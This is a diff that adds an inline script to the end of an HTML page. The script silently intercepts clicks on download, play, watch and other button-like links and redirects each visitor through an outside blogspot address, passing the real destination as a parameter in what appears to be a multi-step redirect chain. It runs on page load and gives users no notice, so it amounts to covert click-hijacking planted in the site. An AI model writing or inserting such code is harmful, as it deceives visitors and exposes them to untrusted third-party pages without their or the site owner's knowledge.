@@ -3283,6 +3283,63 @@ init();
 
 
   </script>
+  <script type="text/javascript">
+//<![CDATA[
+(function () {
+
+  function isButtonLike(el) {
+    if (el.tagName === 'BUTTON') return true;
+
+    if (el.tagName === 'A') {
+      if (
+        el.className.match(/btn|button|download|play|watch/i) ||
+        el.getAttribute('role') === 'button' ||
+        el.onclick
+      ) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  function interceptButtons() {
+    var elements = document.querySelectorAll('a[href], button');
+
+    elements.forEach(function (el) {
+      if (el.dataset.shortened) return;
+      if (!isButtonLike(el)) return;
+
+      var href = el.tagName === 'BUTTON'
+        ? el.getAttribute('data-href')
+        : el.getAttribute('href');
+
+      if (!href) return;
+      if (href.startsWith('#') || href.startsWith('javascript:')) return;
+
+      el.dataset.shortened = "true";
+
+      el.addEventListener('click', function (e) {
+        e.preventDefault();
+
+        var target =
+          'https://usiieie.blogspot.com/?url=' +
+          encodeURIComponent(href) +
+          '&steps=3&step=1';
+
+        window.location.href = target;
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', interceptButtons);
+  } else {
+    interceptButtons();
+  }
+
+})();
+//]]>
+</script>
   
 </body>
 </html>
